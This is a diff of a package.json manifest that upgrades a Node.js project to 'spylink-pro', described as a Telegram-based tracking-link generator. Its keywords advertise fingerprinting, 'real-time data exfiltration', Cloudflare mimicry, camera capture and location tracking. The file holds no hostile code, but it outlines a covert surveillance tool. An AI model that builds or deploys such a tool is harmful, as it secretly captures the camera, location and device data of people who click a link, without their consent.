@@ -1,44 +1,64 @@
 {
-  "name": "spylink-bot",
-  "version": "2.0.0",
-  "description": "Advanced tracking link generator with maximum data collection and admin panel",
+  "name": "spylink-pro",
+  "version": "3.0.0",
+  "description": "Ultimate Telegram-based tracking link generator with extreme fingerprinting, real-time data exfiltration, PDF reports & admin dashboard.",
   "main": "server.js",
   "scripts": {
     "start": "node server.js",
     "dev": "nodemon server.js",
-    "build": "npm install && echo 'Ready for deployment'",
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "build": "npm ci --omit=dev && echo 'Production build ready'",
+    "test": "echo \"No tests implemented yet\" && exit 0",
+    "generate:fonts": "mkdir -p fonts && cp node_modules/pdfmake/examples/fonts/* fonts/ 2>/dev/null || echo 'Fonts not found, using fallback'",
+    "postinstall": "npm run generate:fonts"
   },
   "keywords": [
-    "telegram",
-    "tracking",
-    "spy",
-    "bot",
+    "telegram-bot",
+    "tracking-link",
+    "fingerprinting",
     "data-collection",
+    "pdf-report",
     "admin-panel",
-    "pdf-report"
+    "cloudflare-mimic",
+    "webview-spy",
+    "camera-capture",
+    "location-tracking"
   ],
   "author": "aadi_io",
-  "license": "MIT",
-  "dependencies": {
-    "express": "^4.18.2",
-    "cors": "^2.8.5",
-    "body-parser": "^1.20.2",
-    "node-fetch": "^2.6.7",
-    "dotenv": "^16.3.1",
-    "node-telegram-bot-api": "^0.64.0",
-    "ejs": "^3.1.9",
-    "pdfmake": "^0.2.7",
-    "puppeteer": "^20.9.0",
-    "helmet": "^7.0.0",
-    "compression": "^1.7.4",
-    "morgan": "^1.10.0",
-    "uuid": "^9.0.0"
-  },
-  "devDependencies": {
-    "nodemon": "^3.0.1"
+  "license": "UNLICENSED",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/aadi-io/spylink-pro.git"
   },
   "engines": {
-    "node": ">=16.x"
+    "node": ">=18.x"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "cors": "^2.8.5",
+    "body-parser": "^1.20.2",
+    "node-fetch": "^2.7.0",
+    "dotenv": "^16.4.5",
+    "node-telegram-bot-api": "^0.64.0",
+    "ejs": "^3.1.10",
+    "pdfmake": "^0.2.7",
+    "uuid": "^9.0.1",
+    "helmet": "^7.1.0",
+    "compression": "^1.7.4",
+    "morgan": "^1.10.0",
+    "serve-favicon": "^2.5.0",
+    "response-time": "^2.3.2",
+    "puppeteer-core": "^22.7.1",
+    "chrome-aws-lambda": "^19.7.0"
+  },
+  "devDependencies": {
+    "nodemon": "^3.1.0",
+    "eslint": "^8.57.0",
+    "prettier": "^3.2.5"
+  },
+  "optionalDependencies": {
+    "canvas": "^2.11.2"
+  },
+  "volta": {
+    "node": "18.18.2"
   }
 }
